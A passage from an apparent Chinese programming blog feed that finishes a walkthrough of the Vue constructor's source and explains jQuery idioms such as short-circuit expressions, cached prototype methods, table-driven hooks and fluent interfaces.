<h3 id="src-core-instance-index-js"><a href="#src-core-instance-index-js" class="headerlink" title="/src/core/instance/index.js"></a>/src/core/instance/index.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; initMixin &#125; <span class="keyword">from</span> <span class="string">'./init'</span></span><br><span class="line"><span class="keyword">import</span> &#123; stateMixin &#125; <span class="keyword">from</span> <span class="string">'./state'</span></span><br><span class="line"><span class="keyword">import</span> &#123; renderMixin &#125; <span class="keyword">from</span> <span class="string">'./render'</span></span><br><span class="line"><span class="keyword">import</span> &#123; eventsMixin &#125; <span class="keyword">from</span> <span class="string">'./events'</span></span><br><span class="line"><span class="keyword">import</span> &#123; lifecycleMixin &#125; <span class="keyword">from</span> <span class="string">'./lifecycle'</span></span><br><span class="line"><span class="keyword">import</span> &#123; warn &#125; <span class="keyword">from</span> <span class="string">'../util/index'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)</span><br><span class="line">  ) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装_init</span></span><br><span class="line">initMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装$set $delete $watch $data $props</span></span><br><span class="line">stateMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装$on $once $off $emit</span></span><br><span class="line">eventsMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装_update $forceUpdate $destroy</span></span><br><span class="line">lifecycleMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装$nextTick _render 和一堆render相关方法</span></span><br><span class="line">renderMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure>
<ul>
<li>我们终于看到构造函数<code>Vue</code>的庐山真面目了，众里寻他千百度，蓦然回首。</li>
<li>除了声明了<code>Vue</code>构造函数，这里还分别调用了<ul>
<li><code>initMixin(Vue);</code></li>
<li><code>stateMixin(Vue);</code></li>
<li><code>eventsMixin(Vue);</code></li>
<li><code>lifecycleMixin(Vue);</code></li>
<li><code>renderMixin(Vue)</code></li>
</ul>
</li>
<li>他们的作用是向<code>Vue</code>原型上安装方法。具体安装哪些后边用图示说明</li>
<li>值得注意的是，在<code>renderMixin(Vue)</code>中还安装了好几个的原型方法，用于渲染VNode相关操作。</li>
</ul>
<blockquote>
<p>至此，<code>Vue</code>的构造函数创建过程就完成了，用一张图来表示整个<code>Vue</code>的原型方法，全局API的安装过程</p>
</blockquote>
<p><img src="/static/img/Vue.svg" width="880"></p>
<h2 id="经过这一系列的骚操作，Vue就是这个样子了"><a href="#经过这一系列的骚操作，Vue就是这个样子了" class="headerlink" title="经过这一系列的骚操作，Vue就是这个样子了"></a>经过这一系列的骚操作，Vue就是这个样子了</h2><p><img src="/static/img/Vue123.svg" width="880"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果你也想写一个大的框架的话，在最新的标准<code>es2015</code>下，你可以借鉴<code>Vue</code>的写法，分层次给构造函数添加原型方法以及全局API。利用策略模式分离可变和不变逻辑。</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery_源码分析_奇淫技巧</title>
    <url>/2017/04/17/jQuery_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>系列第一篇： <a href="/2018/04/17/jQuery-源码分析/">【深入浅出jQuery】源码浅析–整体架构</a></p>
<p>本篇是系列第二篇，标题起得有点大，希望内容对得起这个标题，这篇文章主要总结一下在 jQuery 中一些十分讨巧的 coding 方式，将会由浅及深，可能会有一些基础，但是我希望全面一点，对看文章的人都有所帮助，源码我还一直在阅读，也会不断的更新本文。</p>
<p>即便你不想去阅读源码，看看下面的总结，我想对提高编程能力，转换思维方式都大有裨益，废话少说，进入正题。</p>
<h2 id="短路表达式-与-多重短路表达式"><a href="#短路表达式-与-多重短路表达式" class="headerlink" title="短路表达式 与 多重短路表达式"></a>短路表达式 与 多重短路表达式</h2><p><code>短路表达式</code>这个应该人所皆知了。在 <code>jQuery</code> 中，大量的使用了短路表达式与多重短路表达式。</p>
<p><code>短路表达式</code>：作为”&amp;&amp;”和”||”操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。这是这两个操作符的一个重要属性。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ||短路表达式</span></span><br><span class="line"><span class="keyword">var</span> foo = a || b;</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">if</span>(a)&#123;</span><br><span class="line">    foo = a;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    foo = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &amp;&amp;短路表达式</span></span><br><span class="line"><span class="keyword">var</span> bar = a &amp;&amp; b;</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">if</span>(a)&#123;</span><br><span class="line">    bar = b;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    bar = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当然，上面两个例子是短路表达式最简单是情况，多数情况下，<code>jQuery</code> 是这样使用它们的：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选自 jQuery 源码中的 Sizzle 部分</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">siblingCheck</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cur = b &amp;&amp; a,</span><br><span class="line">        diff = cur &amp;&amp; a.nodeType === <span class="number">1</span> &amp;&amp; b.nodeType === <span class="number">1</span> &amp;&amp;</span><br><span class="line">        (~b.sourceIndex || MAX_NEGATIVE) -</span><br><span class="line">        (~a.sourceIndex || MAX_NEGATIVE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// other code ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>嗯，可以看到，<code>diff</code> 的值经历了多重短路表达式配合一些全等判断才得出，这种代码很优雅，但是可读性下降了很多，使用的时候权衡一下，多重短路表达式和简单短路表达式其实一样，只需要先把后面的当成一个整体，依次推进，得出最终值。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, c = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = a &amp;&amp; b &amp;&amp; c, <span class="comment">// 0 ,相当于 a &amp;&amp; (b &amp;&amp; c)</span></span><br><span class="line">  bar = a || b || c;  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>这里需要提出一些值得注意的点：</p>
<p>1、在 <code>Javascript</code> 的逻辑运算中，<code>0、&quot;&quot;、null、false、undefined、NaN</code> 都会判定为 <code>false</code> ，而其他都为 <code>true</code> ；</p>
<p>2、因为 <code>Javascript</code> 的内置弱类型域 <code>(weak-typing domain)</code>，所以对严格的输入验证这一点不太在意，即便使用 &amp;&amp; 或者 || 运算符的运算数不是布尔值，仍然可以将它看作布尔运算。虽然如此，还是建议如下：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(foo)&#123; ... &#125;     <span class="comment">//不够严谨</span></span><br><span class="line"><span class="keyword">if</span>(!!foo)&#123; ... &#125;   <span class="comment">//更为严谨，!!可将其他类型的值转换为boolean类型</span></span><br></pre></td></tr></table></figure></p>
<p>注重细节，<code>JavaScript</code> 既不弱也不低等，我们只是需要更努力一点工作以使我们的代码变得真正健壮。</p>
<h2 id="预定义常用方法的入口"><a href="#预定义常用方法的入口" class="headerlink" title="预定义常用方法的入口"></a>预定义常用方法的入口</h2><p>在 <code>jQuery</code> 的头几十行，有这么一段有趣的代码：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, undefined</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span></span><br><span class="line">        <span class="comment">// 定义了一个对象变量，一个字符串变量，一个数组变量</span></span><br><span class="line">        class2type = &#123;&#125;,</span><br><span class="line">        core_version = <span class="string">"1.10.2"</span>,</span><br><span class="line">        core_deletedIds = [],</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存了对象、字符串、数组的一些常用方法 concat push 等等...</span></span><br><span class="line">        core_concat = core_deletedIds.concat,</span><br><span class="line">        core_push = core_deletedIds.push,</span><br><span class="line">        core_slice = core_deletedIds.slice,</span><br><span class="line">        core_indexOf = core_deletedIds.indexOf,</span><br><span class="line">        core_toString = class2type.toString,</span><br><span class="line">        core_hasOwn = class2type.hasOwnProperty,</span><br><span class="line">        core_trim = core_version.trim;</span><br><span class="line"></span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p>
<p>不得不说，<code>jQuery</code> 在细节上做的真的很好，这里首先定义了一个对象变量、一个字符串变量、数组变量，要注意这 3 个变量本身在下文是有自己的用途的（可以看到，<code>jQuery</code> 作者惜字如金，真的是去压榨每一个变量的作用，使其作用最大化）；其次，借用这三个变量，再定义些常用的核心方法，从上往下是数组的 <code>concat、push 、slice 、indexOf</code> 方法，对象的 <code>toString 、hasOwnProperty</code> 方法以及字符串的 <code>trim</code> 方法，<code>core_xxxx</code> 这几个变量事先存储好了这些常用方法的入口，如果下文行文当中需要调用这些方法，将会：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">jQuery.fn = jQuery.prototype = &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 jQuery 对象转换成数组类型</span></span><br><span class="line">    toArray: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 调用数组的 slice 方法，使用预先定义好了的 core_slice ，节省查找内存地址时间，提高效率</span></span><br><span class="line">        <span class="comment">// 相当于 return Array.prototype.slice.call(this)</span></span><br><span class="line">        <span class="keyword">return</span> core_slice.call(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，当需要使用这些预先定义好的方法，只需要借助 <code>call</code> 或者 <code>apply</code>（ <a href="/2018/04/19/ECMA-理解call和apply/">戳我详解</a> ）进行调用。<br>那么 <code>jQuery</code> 为什么要这样做呢，我觉得：</p>
<p>1、以数组对象的 <code>concat</code> 方法为例，如果不预先定义好 <code>core_concat = core_deletedIds.concat</code> 而是调用实例 <code>arr</code> 的方法 <code>concat</code> 时，首先需要辨别当前实例 <code>arr</code> 的类型是 <code>Array</code>，在内存空间中寻找 <code>Array</code> 的 <code>concat</code> 内存入口，把当前对象 <code>arr</code> 的指针和其他参数压入栈，跳转到 <code>concat</code> 地址开始执行，而当保存了 <code>concat</code> 方法的入口 <code>core_concat</code> 时，完全就可以省去前面两个步骤，从而提升一些性能；</p>
<p>2、另外一点，借助 <code>call</code> 或者 <code>apply</code> 的方式调用，让一些类数组可以直接调用数组的方法。就如上面是示例，<code>jQuery</code> 对象是类数组类型，可以直接调用数组的 <code>slice</code> 方法转换为数组类型。又譬如，将参数 <code>arguments</code> 转换为数组类型：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a,b,c</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 将参数 arguments 转换为数组</span></span><br><span class="line">    <span class="comment">// 使之可以调用数组成员方法</span></span><br><span class="line">    <span class="keyword">var</span> arr = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="钩子机制（hook）"><a href="#钩子机制（hook）" class="headerlink" title="钩子机制（hook）"></a>钩子机制（hook）</h2><p>在 <code>jQuery 2.0.0</code> 之前的版本，对兼容性做了大量的处理，正是这样才让广大开发人员能够忽略不同浏览器的不同特性的专注于业务本身的逻辑。而其中，钩子机制在浏览器兼容方面起了十分巨大的作用。</p>
<p>钩子是编程惯用的一种手法，用来解决一种或多种特殊情况的处理。</p>
<p>简单来说，钩子就是适配器原理，或者说是表驱动原理，我们预先定义了一些钩子，在正常的代码逻辑中使用钩子去适配一些特殊的属性，样式或事件，这样可以让我们少写很多 <code>else if</code> 语句。</p>
<p>如果还是很难懂，看一个简单的例子，举例说明 <code>hook</code> 到底如何使用：</p>
<p>现在考公务员，要么靠实力，要么靠关系，但领导肯定也不会弄的那么明显，一般都是暗箱操作，这个场景用钩子实现再合理不过了。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果不用钩子的情况</span></span><br><span class="line"><span class="comment">// 考生分数以及父亲名</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">examinee</span>(<span class="params">name, score, fatherName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name: name,</span><br><span class="line">        score: score,</span><br><span class="line">        fatherName: fatherName</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 审阅考生们</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">examinees</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> examinees) &#123;</span><br><span class="line">        <span class="keyword">var</span> curExaminee = examinees[i];</span><br><span class="line">        <span class="keyword">var</span> ret = curExaminee.score;</span><br><span class="line">        <span class="comment">// 判断是否有后门关系</span></span><br><span class="line">        <span class="keyword">if</span> (curExaminee.fatherName === <span class="string">'xijingping'</span>) &#123;</span><br><span class="line">            ret += <span class="number">1000</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curExaminee.fatherName === <span class="string">'ligang'</span>) &#123;</span><br><span class="line">            ret += <span class="number">100</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curExaminee.fatherName === <span class="string">'pengdehuai'</span>) &#123;</span><br><span class="line">            ret += <span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result[curExaminee.name] = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lihao = examinee(<span class="string">"lihao"</span>, <span class="number">10</span>, <span class="string">'ligang'</span>);</span><br><span class="line"><span class="keyword">var</span> xida = examinee(<span class="string">'xida'</span>, <span class="number">8</span>, <span class="string">'xijinping'</span>);</span><br><span class="line"><span class="keyword">var</span> peng = examinee(<span class="string">'peng'</span>, <span class="number">60</span>, <span class="string">'pengdehuai'</span>);</span><br><span class="line"><span class="keyword">var</span> liaoxiaofeng = examinee(<span class="string">'liaoxiaofeng'</span>, <span class="number">100</span>, <span class="string">'liaodaniu'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = judge([lihao, xida, peng, liaoxiaofeng]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据分数选取前三名</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> name <span class="keyword">in</span> result) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"name:"</span> + name);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"score:"</span> + score);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，在中间审阅考生这个函数中，运用了很多 <code>else if</code> 来判断是否考生有后门关系，如果现在业务场景发生变化，又多了几名考生，那么 <code>else if</code> 势必越来越复杂，往后维护代码也将越来越麻烦，成本很大，那么这个时候如果使用钩子机制，该如何做呢？<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// relationHook 是个钩子函数，用于得到关系得分</span></span><br><span class="line"><span class="keyword">var</span> relationHook = &#123;</span><br><span class="line">    <span class="string">"xijinping"</span>: <span class="number">1000</span>,</span><br><span class="line">    <span class="string">"ligang"</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">"pengdehuai"</span>: <span class="number">50</span>,</span><br><span class="line">　　 <span class="comment">// 新的考生只需要在钩子里添加关系分</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 考生分数以及父亲名</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">examinee</span>(<span class="params">name, score, fatherName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name: name,</span><br><span class="line">        score: score,</span><br><span class="line">        fatherName: fatherName</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 审阅考生们</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">examinees</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> examinees) &#123;</span><br><span class="line">        <span class="keyword">var</span> curExaminee = examinees[i];</span><br><span class="line">        <span class="keyword">var</span> ret = curExaminee.score;</span><br><span class="line">        <span class="keyword">if</span> (relationHook[curExaminee.fatherName] ) &#123;</span><br><span class="line">            ret += relationHook[curExaminee.fatherName] ;</span><br><span class="line">        &#125;</span><br><span class="line">        result[curExaminee.name] = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lihao = examinee(<span class="string">"lihao"</span>, <span class="number">10</span>, <span class="string">'ligang'</span>);</span><br><span class="line"><span class="keyword">var</span> xida = examinee(<span class="string">'xida'</span>, <span class="number">8</span>, <span class="string">'xijinping'</span>);</span><br><span class="line"><span class="keyword">var</span> peng = examinee(<span class="string">'peng'</span>, <span class="number">60</span>, <span class="string">'pengdehuai'</span>);</span><br><span class="line"><span class="keyword">var</span> liaoxiaofeng = examinee(<span class="string">'liaoxiaofeng'</span>, <span class="number">100</span>, <span class="string">'liaodaniu'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = judge([lihao, xida, peng, liaoxiaofeng]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据分数选取前三名</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> name <span class="keyword">in</span> result) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"name:"</span> + name);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"score:"</span> + score);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，使用钩子去处理特殊情况，可以让代码的逻辑更加清晰，省去大量的条件判断，上面的钩子机制的实现方式，采用的就是表驱动方式，就是我们事先预定好一张表（俗称打表），用这张表去适配特殊情况。当然 <code>jQuery</code> 的 <code>hook</code> 是一种更为抽象的概念，在不同场景可以用不同方式实现。</p>
<p>看看 <code>jQuery</code> 里的表驱动 <code>hook</code> 实现，<code>$.type</code> 方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, undefined</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span></span><br><span class="line">        <span class="comment">// 用于预存储一张类型表用于 hook</span></span><br><span class="line">        class2type = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原生的 typeof 方法并不能区分出一个变量它是 Array 、RegExp 等 object 类型，jQuery 为了扩展 typeof 的表达力，因此有了 $.type 方法</span></span><br><span class="line">    <span class="comment">// 针对一些特殊的对象（例如 null，Array，RegExp）也进行精准的类型判断</span></span><br><span class="line">    <span class="comment">// 运用了钩子机制，判断类型前，将常见类型打表，先存于一个 Hash 表 class2type 里边</span></span><br><span class="line">    jQuery.each(<span class="string">"Boolean Number String Function Array Date RegExp Object Error"</span>.split(<span class="string">" "</span>), <span class="function"><span class="keyword">function</span>(<span class="params">i, name</span>) </span>&#123;</span><br><span class="line">        class2type[<span class="string">"[object "</span> + name + <span class="string">"]"</span>] = name.toLowerCase();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    jQuery.extend(&#123;</span><br><span class="line">        <span class="comment">// 确定JavaScript 对象的类型</span></span><br><span class="line">        <span class="comment">// 这个方法的关键之处在于 class2type[core_toString.call(obj)]</span></span><br><span class="line">        <span class="comment">// 可以使得 typeof obj 为 "object" 类型的得到更进一步的精确判断</span></span><br><span class="line">        type: <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">String</span>(obj);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 利用事先存好的 hash 表 class2type 作精准判断</span></span><br><span class="line">            <span class="comment">// 这里因为 hook 的存在，省去了大量的 else if 判断</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">typeof</span> obj === <span class="string">"object"</span> || <span class="keyword">typeof</span> obj === <span class="string">"function"</span> ?</span><br><span class="line">                class2type[core_toString.call(obj)] || <span class="string">"object"</span> :</span><br><span class="line">                <span class="keyword">typeof</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p>
<p>这里的 <code>hook</code> 只是 <code>jQuery</code> 大量使用钩子的冰山一角，在对 <code>DOM</code> 元素的操作一块，`attr 、val 、prop 、css 方法大量运用了钩子，用于兼容 IE 系列下的一些怪异行为。在遇到钩子函数的时候，要结合具体情境具体分析，这些钩子相对于表驱动而言更加复杂，它们的结构大体如下，只要记住钩子的核心原则，保持代码整体逻辑的流畅性，在特殊的情境下去处理一些特殊的情况：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> someHook = &#123;</span><br><span class="line">    <span class="keyword">get</span>: function(elem) &#123;</span><br><span class="line">        <span class="comment">// obtain and return a value</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"something"</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>: function(elem, value) &#123;</span><br><span class="line">        <span class="comment">// do something with value</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从某种程度上讲，钩子是一系列被设计为以你自己的代码来处理自定义值的回调函数。有了钩子，你可以将差不多任何东西保持在可控范围内。</p>
<p>从设计模式的角度而言，这种钩子运用了策略模式。</p>
<blockquote>
<p>策略模式：将不变的部分和变化的部分隔开是每个设计模式的主题，而策略模式则是将算法的使用与算法的实现分离开来的典型代表。使用策略模式重构代码，可以消除程序中大片的条件分支语句。在实际开发中，我们通常会把算法的含义扩散开来，使策略模式也可以用来封装一系列的“业务规则”。只要这些业务规则指向的目标一致，并且可以被替换使用，我们就可以使用策略模式来封装他们。</p>
</blockquote>
<p>策略模式的优点：</p>
<ul>
<li>策略模式利用组合，委托和多态等技术思想，可以有效的避免多重条件选择语句；</li>
<li>策略模式提供了对开放-封闭原则的完美支持，将算法封装在独立的函数中，使得它们易于切换，易于理解，易于扩展。</li>
<li>策略模式中的算法也可以复用在系统的其它地方，从而避免许多重复的复制粘贴工作。</li>
</ul>
<h2 id="连贯接口"><a href="#连贯接口" class="headerlink" title="连贯接口"></a>连贯接口</h2><p>无论 <code>jQuery</code> 如今的流行趋势是否在下降，它用起来确实让人大呼过瘾，这很大程度归功于它的链式调用，接口的连贯性及易记性。很多人将连贯接口看成链式调用，这并不全面，我觉得连贯接口包含了链式调用且代表更多。而 <code>jQuery</code> 无疑是连贯接口的佼佼者。</p>
<p><code>1、链式调用</code>：链式调用的主要思想就是使代码尽可能流畅易读，从而可以更快地被理解。有了链式调用，我们可以将代码组织为类似语句的片段，增强可读性的同时减少干扰。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统写法</span></span><br><span class="line"><span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"foobar"</span>);</span><br><span class="line">elem.style.background = <span class="string">"red"</span>;</span><br><span class="line">elem.style.color = <span class="string">"green"</span>;</span><br><span class="line">elem.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">"hello world!"</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 写法</span></span><br><span class="line">$(<span class="string">'xxx'</span>)</span><br><span class="line">    .css(<span class="string">"background"</span>, <span class="string">"red"</span>)</span><br><span class="line">    .css(<span class="string">"color"</span>, <span class="string">"green"</span>)</span><br><span class="line">    .on(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    　　alert(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
<p><code>2、命令查询同体</code>：这个上一章也讲过了，就是函数重载。正常而言，应该是命令查询分离（Command and Query Separation，CQS），是源于命令式编程的一个概念。那些改变对象的状态（内部的值）的函数称为命令，而那些检索值的函数称为查询。原则上，查询函数返回数据，命令函数返回状态，各司其职。而 <code>jQuery</code> 将 <code>getter</code> 和 <code>setter</code> 方法压缩到单一方法中创建了一个连贯的接口，使得代码暴露更少的方法，但却以更少的代码实现同样的目标。</p>
<p><code>3、参数映射及处理</code>：<code>jQuery</code> 的接口连贯性还体现在了对参数的兼容处理上，方法如何接收数据比让它们具有可链性更为重要。虽然方法的链式调用是非常普遍的，你可以很容易地在你的代码中实现，但是处理参数却不同，使用者可能传入各种奇怪的参数类型，而 <code>jQuery</code> 作者想的真的很周到，考虑了用户的多种使用场景，提供了多种对参数的处理。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传入键值对</span></span><br><span class="line">jQuery(<span class="string">"#some-selector"</span>)</span><br><span class="line">  .css(<span class="string">"background"</span>, <span class="string">"red"</span>)</span><br><span class="line">  .css(<span class="string">"color"</span>, <span class="string">"white"</span>)</span><br><span class="line">  .css(<span class="string">"font-weight"</span>, <span class="string">"bold"</span>)</span><br><span class="line">  .css(<span class="string">"padding"</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入 JSON 对象</span></span><br><span class="line">jQuery(<span class="string">"#some-selector"</span>).css(&#123;</span><br><span class="line">  <span class="string">"background"</span> : <span class="string">"red"</span>,</span><br><span class="line">  <span class="string">"color"</span> : <span class="string">"white"</span>,</span><br><span class="line">  <span class="string">"font-weight"</span> : <span class="string">"bold"</span>,</span><br><span class="line">  <span class="string">"padding"</span> : <span class="number">10</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p><code>jQuery</code> 的 <code>on()`</code> 方法可以注册事件处理器。和 <code>CSS()</code> 一样它也可以接收一组映射格式的事件，但更进一步地，它允许单一处理器可以被多个事件注册：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// binding events by passing a map</span></span><br><span class="line">jQuery(<span class="string">"#some-selector"</span>).on(&#123;</span><br><span class="line">  <span class="string">"click"</span> : myClickHandler,</span><br><span class="line">  <span class="string">"keyup"</span> : myKeyupHandler,</span><br><span class="line">  <span class="string">"change"</span> : myChangeHandler</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// binding a handler to multiple events:</span></span><br><span class="line">jQuery(<span class="string">"#some-selector"</span>).on(<span class="string">"click keyup change"</span>, myEventHandler);</span><br></pre></td></tr></table></figure></p>
<h2 id="setTimeout-in-Jquery"><a href="#setTimeout-in-Jquery" class="headerlink" title="setTimeout in Jquery"></a>setTimeout in Jquery</h2><p>写到这里，发现上文的主题有些飘忽，接近于写成了 如何写出更好的 Javascript 代码，下面介绍一些 jQuery 中我觉得很棒的小技巧。</p>
